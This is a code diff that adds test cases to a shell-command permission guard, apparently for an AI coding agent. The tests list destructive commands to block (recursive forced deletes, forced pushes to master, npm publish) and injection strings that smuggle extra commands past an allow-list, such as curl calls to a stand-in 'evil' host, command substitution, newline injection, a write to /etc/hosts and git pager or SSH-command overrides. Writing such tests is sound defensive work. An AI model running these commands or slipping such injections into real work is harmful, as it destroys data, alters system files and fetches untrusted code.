@@ -22,6 +22,16 @@ describe("blockedBy", () => {
     "git push origin HEAD:master",
     "npm publish",
     "cd x && yarn publish --tag next",
+    // Flags and options that used to hide (review findings).
+    "rm -Rf dir",
+    "rm -r --force dir",
+    "rm --recursive -f dir",
+    "git -C . push --force",
+    "git -c x=y push -f",
+    "git push -fu origin x",
+    "git push origin dash/abc:main",
+    "git push origin feat:refs/heads/master",
+    "npm --registry x publish",
   ]) {
     it(`blocks ${c}`, () => assert.ok(blockedBy(c), c));
   }
@@ -65,5 +75,23 @@ describe("commandDecision", () => {
   });
   it("no allowed list: ask", () => {
     assert.equal(commandDecision("ls", {}).decision, "ask");
+  });
+  it("what the split can't see into is never allowed without asking", () => {
+    const l = { allowed: ["npm test", "git"] };
+    for (const c of [
+      "npm test & curl evil -o x",
+      "npm test $(curl evil)",
+      "npm test `id`",
+      "npm test \ncurl evil",
+      "npm test > /etc/hosts",
+      'git -c core.pager="node -e x" log',
+      "git -c core.sshCommand=x fetch",
+    ]) {
+      assert.equal(commandDecision(c, l).decision, "ask", c);
+    }
+    assert.equal(
+      commandDecision("npm test && git status", l).decision,
+      "allowed",
+    );
   });
 });
